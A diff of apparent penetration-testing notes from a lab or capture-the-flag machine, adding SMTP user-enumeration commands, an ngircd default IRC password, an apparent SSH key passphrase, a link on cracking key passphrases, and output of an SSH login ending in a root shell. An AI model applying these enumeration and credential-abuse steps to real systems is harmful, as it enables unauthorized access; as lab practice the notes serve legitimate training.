@@ -176,7 +176,7 @@ drwxr-xr-x 11 kali kali 4096 Apr 22 09:24 ..
 -rw-r--r--  1 kali kali   33 Jan  4  2019 channels
 -rw-r--r--  1 kali kali  185 Apr 22 09:24 .listing
 
-└─$ cat 192.168.110.21/.ngircd/channels                                                     1 ⨯
+└─$ cat 192.168.110.21/.ngircd/channels
 channels:
 games
 tormentedprinter
@@ -345,10 +345,18 @@ Looking up status of 192.168.110.21
     16 queries in 1 seconds (16.0 queries / sec)
 
 
+
+smtp-user-enum -M VRFY -U users.txt -t 192.168.56.109
+smtp-user-enum -M EXPN -U users.txt -t 192.168.56.109
+
+
 HexChat > Networks > add > 192.168.110.21/6667 > Password default of ngircd is wealllikedebian (/etc/ngircd/ngircd.conf) >
  #tormentedprinter 
  
  ==>mostmachineshaveasupersecurekeyandalongpassphrase
+
+
+https://null-byte.wonderhowto.com/how-to/crack-ssh-private-key-passwords-with-john-ripper-0302810/
 
 
     └─$ ssh patrick@192.168.110.21 -i id_rsa 
@@ -412,3 +420,6 @@ HexChat > Networks > add > 192.168.110.21/6667 > Password default of ngircd is w
     root@TORMENT:/home/qiu# id
     id
     uid=0(root) gid=0(root) groups=0(root)
+
+
+wealllikedebian
